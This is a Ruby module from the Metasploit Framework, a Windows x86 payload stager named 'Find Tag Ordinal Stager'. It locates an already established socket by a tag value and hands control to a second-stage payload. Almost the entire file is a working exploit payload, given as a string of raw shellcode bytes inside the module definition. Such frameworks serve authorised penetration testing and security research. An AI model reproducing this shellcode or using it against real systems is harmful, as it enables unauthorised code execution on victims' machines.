##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/handler/find_tag'


module Metasploit3

  include Msf::Payload::Stager
  include Msf::Payload::Windows

  handler module_name: 'Msf::Handler::FindTag'

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Find Tag Ordinal Stager',
      'Description'   => 'Use an established connection',
      'Author'        => 'skape',
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Convention'    => 'sockedi',
      'SymbolLookup'  => 'ws2ord',
      'Stager'        =>
        {
          'Offsets' =>
            {
              'TAG' => [ 84, 'RAW' ],
            },
          'Payload' =>
            "\xfc\x33\xff\x64\x8b\x47\x30\x8b\x40\x0c\x8b\x58\x1c\x8b" +
            "\x1b\x8b\x73\x20\xad\xad\x4e\x03\x06\x3d\x32\x33\x5f\x32" +
            "\x75\xef\x8b\x6b\x08\x8b\x45\x3c\x8b\x4c\x05\x78\x8b\x4c" +
            "\x0d\x1c\x8b\x5c\x29\x3c\x03\xdd\x03\x6c\x29\x24\x57\x66" +
            "\x47\x8b\xf4\x56\x68\x7f\x66\x04\x40\x57\xff\xd5\xad\x85" +
            "\xc0\x74\xee\x99\x52\xb6\x0c\x52\x56\x57\xff\xd3\xad\x3d" +
            "\x6d\x73\x66\x21\x75\xdd\xff\xe6"
        }
      ))
  end

end
